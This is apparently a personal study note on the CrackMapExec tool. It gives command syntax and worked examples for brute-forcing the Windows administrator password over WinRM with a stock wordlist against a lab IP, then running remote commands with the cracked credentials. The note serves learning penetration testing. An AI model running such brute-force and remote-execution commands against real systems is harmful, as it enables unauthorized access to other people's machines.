
#### Used to brute force services: SMB, MSSQL, WinRM, FTP, SSH, RDP, LDAP.
- This tool is preinstalled on Kali.

## **<mark style="background: #0b5345;">How to use:</mark>**
`crackmapexec <protocol> <target_ip -u <target_user> -p <wordlist_path>`  
- Example:  `crackmapexec winrm 10.6.22.164 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`  
- We used the administrator account it exists in every windows machine and it has the highest privilages.

## **<mark style="background: #239b56;">To send commands after we found a user password:</mark>**

`crackmapexec <protocol <target_ip> -u <user> -p <password> -x "<command_in_a_quotation_marks>"`

- Example: `crackmapexec winrm 10.6.22.164 -u administrator -p tinkerbell -x "whoami"`


![[Pasted image 20250409175007.png | 800]]


